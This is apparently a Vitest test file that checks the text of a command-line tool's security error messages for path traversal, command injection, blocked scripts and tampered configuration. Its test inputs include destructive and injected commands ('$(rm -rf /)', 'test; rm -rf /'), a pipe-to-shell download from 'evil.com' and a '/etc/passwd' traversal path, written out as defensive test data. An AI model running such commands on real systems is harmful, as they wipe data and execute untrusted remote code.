import { describe, expect, it } from 'vitest';
import { ERROR_MESSAGES } from '../../../core/foundation/core/constants.js';

describe('ERROR_MESSAGES Security Constants', () => {
  describe('Existing error messages', () => {
    it('should generate INVALID_COMMAND_PATH error message', () => {
      const path = '../../../etc';
      const result = ERROR_MESSAGES.INVALID_COMMAND_PATH(path);

      expect(result).toContain('Invalid or unsafe commands directory path: ../../../etc');
      expect(result).toContain(
        'Command paths must be within the current working directory for security'
      );
    });

    it('should generate COMMAND_NAME_CONFLICT error message', () => {
      const result = ERROR_MESSAGES.COMMAND_NAME_CONFLICT(
        'deploy',
        '/path/to/commands/deploy.ts',
        'commands',
        '/path/to/other/deploy.ts',
        'other-commands'
      );

      expect(result).toContain("Command name conflict: 'deploy' is defined in both:");
      expect(result).toContain('/path/to/commands/deploy.ts (from commands)');
      expect(result).toContain('/path/to/other/deploy.ts (from other-commands)');
      expect(result).toContain('Please rename one of the commands to avoid conflicts');
    });
  });

  describe('New security-focused error messages', () => {
    it('should generate SUSPICIOUS_INPUT_DETECTED error message', () => {
      const input = '$(rm -rf /)';
      const pattern = 'command-injection';
      const result = ERROR_MESSAGES.SUSPICIOUS_INPUT_DETECTED(input, pattern);

      expect(result).toContain('Suspicious input detected: "$(rm -rf /)"');
      expect(result).toContain('matches security pattern: command-injection');
      expect(result).toContain('This input has been rejected for security reasons');
    });

    it('should generate PRIVILEGE_ESCALATION_ATTEMPT error message', () => {
      const result = ERROR_MESSAGES.PRIVILEGE_ESCALATION_ATTEMPT();

      expect(result).toContain('Refusing to run with elevated privileges');
      expect(result).toContain('Use --allow-root flag if intentional');
      expect(result).toContain('you understand the security risks');
    });

    it('should generate UNSAFE_TEMPLATE_SOURCE error message', () => {
      const url = 'http://malicious-site.com/template.zip';
      const result = ERROR_MESSAGES.UNSAFE_TEMPLATE_SOURCE(url);

      expect(result).toContain(
        'Template source not whitelisted: http://malicious-site.com/template.zip'
      );
      expect(result).toContain('Only verified sources allowed');
      expect(result).toContain(
        'Please use official templates or add this source to your allowlist'
      );
    });

    it('should generate SCRIPT_EXECUTION_BLOCKED error message', () => {
      const script = 'curl http://evil.com | sh';
      const result = ERROR_MESSAGES.SCRIPT_EXECUTION_BLOCKED(script);

      expect(result).toContain('Script execution blocked for security: curl http://evil.com | sh');
      expect(result).toContain('Use --allow-scripts if needed');
      expect(result).toContain('you trust the script source');
    });

    it('should generate MALICIOUS_PATH_DETECTED error message', () => {
      const path = '../../../etc/passwd';
      const reason = 'path traversal attack';
      const result = ERROR_MESSAGES.MALICIOUS_PATH_DETECTED(path, reason);

      expect(result).toContain('Malicious path detected: "../../../etc/passwd"');
      expect(result).toContain('(path traversal attack)');
      expect(result).toContain('Operation blocked for security');
    });

    it('should generate COMMAND_INJECTION_ATTEMPT error message', () => {
      const input = 'test; rm -rf /';
      const result = ERROR_MESSAGES.COMMAND_INJECTION_ATTEMPT(input);

      expect(result).toContain('Command injection attempt detected in input: "test; rm -rf /"');
      expect(result).toContain('Operation blocked');
    });

    it('should generate UNSAFE_FILE_OPERATION error message', () => {
      const operation = 'delete';
      const path = '/etc/passwd';
      const result = ERROR_MESSAGES.UNSAFE_FILE_OPERATION(operation, path);

      expect(result).toContain('Unsafe file operation "delete" blocked for path: "/etc/passwd"');
      expect(result).toContain('Path must be within project directory');
    });

    it('should generate CONFIGURATION_TAMPERING error message', () => {
      const config = 'package.json';
      const issue = 'malicious postinstall script';
      const result = ERROR_MESSAGES.CONFIGURATION_TAMPERING(config, issue);

      expect(result).toContain(
        'Configuration tampering detected in package.json: malicious postinstall script'
      );
      expect(result).toContain('Using safe defaults instead');
    });
  });

  describe('Error message type safety', () => {
    it('should ensure all error message functions return strings', () => {
      expect(typeof ERROR_MESSAGES.INVALID_COMMAND_PATH('test')).toBe('string');
      expect(
        typeof ERROR_MESSAGES.COMMAND_NAME_CONFLICT('test', 'path1', 'src1', 'path2', 'src2')
      ).toBe('string');
      expect(typeof ERROR_MESSAGES.SUSPICIOUS_INPUT_DETECTED('input', 'pattern')).toBe('string');
      expect(typeof ERROR_MESSAGES.PRIVILEGE_ESCALATION_ATTEMPT()).toBe('string');
      expect(typeof ERROR_MESSAGES.UNSAFE_TEMPLATE_SOURCE('url')).toBe('string');
      expect(typeof ERROR_MESSAGES.SCRIPT_EXECUTION_BLOCKED('script')).toBe('string');
      expect(typeof ERROR_MESSAGES.MALICIOUS_PATH_DETECTED('path', 'reason')).toBe('string');
      expect(typeof ERROR_MESSAGES.COMMAND_INJECTION_ATTEMPT('input')).toBe('string');
      expect(typeof ERROR_MESSAGES.UNSAFE_FILE_OPERATION('op', 'path')).toBe('string');
      expect(typeof ERROR_MESSAGES.CONFIGURATION_TAMPERING('config', 'issue')).toBe('string');
    });

    it('should handle empty and special characters safely', () => {
      expect(() => ERROR_MESSAGES.SUSPICIOUS_INPUT_DETECTED('', '')).not.toThrow();
      expect(() => ERROR_MESSAGES.UNSAFE_TEMPLATE_SOURCE('')).not.toThrow();
      expect(() => ERROR_MESSAGES.SCRIPT_EXECUTION_BLOCKED('')).not.toThrow();
      expect(() => ERROR_MESSAGES.MALICIOUS_PATH_DETECTED('', '')).not.toThrow();
      expect(() => ERROR_MESSAGES.COMMAND_INJECTION_ATTEMPT('')).not.toThrow();
      expect(() => ERROR_MESSAGES.UNSAFE_FILE_OPERATION('', '')).not.toThrow();
      expect(() => ERROR_MESSAGES.CONFIGURATION_TAMPERING('', '')).not.toThrow();
    });
  });
});
